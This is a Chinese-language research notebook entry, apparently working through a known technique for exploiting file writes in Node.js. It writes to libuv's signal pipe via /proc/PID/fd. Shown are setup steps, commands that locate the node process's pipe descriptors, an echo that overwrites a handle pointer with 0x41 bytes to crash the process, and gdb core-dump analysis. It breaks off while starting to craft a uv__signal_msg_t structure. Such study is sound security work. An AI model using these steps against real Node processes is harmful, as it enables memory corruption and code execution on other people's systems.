> [!info] 
> 参考：
> https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html
> https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/ 


## 1 环境配置

下载可以apt install 
以及
直接官网下载
![](../images/Pasted%20image%2020250612151728.png)

但是似乎官网下载的才关闭了PIE

![](../images/Pasted%20image%2020250707144726.png)


https://nodejs.org/download/release/v22.9.0/


```
tar -xvf node-v22.9.0-linux-x64.tar.xz

```

## 2 准备

找到Libuv的pipe

```bash
pid=$(ps -ef | grep '[n]ode-v22.16.0' | awk '{print $2}' | head -n1); echo "PID: $pid"; ll /proc/$pid/fd/

echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >>  /proc/1982143/fd/18
```

![](../images/Pasted%20image%2020250612152534.png)

经过测试12，13 和17，18都会导致crash
A字符不够都不会crash
原理是handle指针被输入的0x41414141覆盖了




为了进一步确认，我们检查一下dump文件

```
ulimit -c unlimited
echo "core" | sudo tee /proc/sys/kernel/core_pattern
```

这样会在当前路径下生成core文件
![](../images/Pasted%20image%2020250707145837.png)

然后打开gdb

```
gdb node-v22/bin/node
core-file core.383455
```

![](../images/Pasted%20image%2020250707145957.png)
![](../images/Pasted%20image%2020250707150054.png)
看起来和参考很像但是地址不是一个（？）

再试试其他fd，都是一样的
![](../images/Pasted%20image%2020250707150302.png)

直接试试参考的payload
![](../images/Pasted%20image%2020250707165332.png)

哦好像版本不太对，这个是22.16，参考是22.9

倒是没有dump但是也没有反应

![](../images/Pasted%20image%2020250707165436.png)
原来pipe的fd变了，改回11

![](../images/Pasted%20image%2020250707165604.png)
还是报错

好吧可能这个参考不是用22.9做的（
只好自己一步步来看看了

来整理一下步骤
写入一个`uv__signal_msg_t`结构体数据，handle指针指向后续地址，signum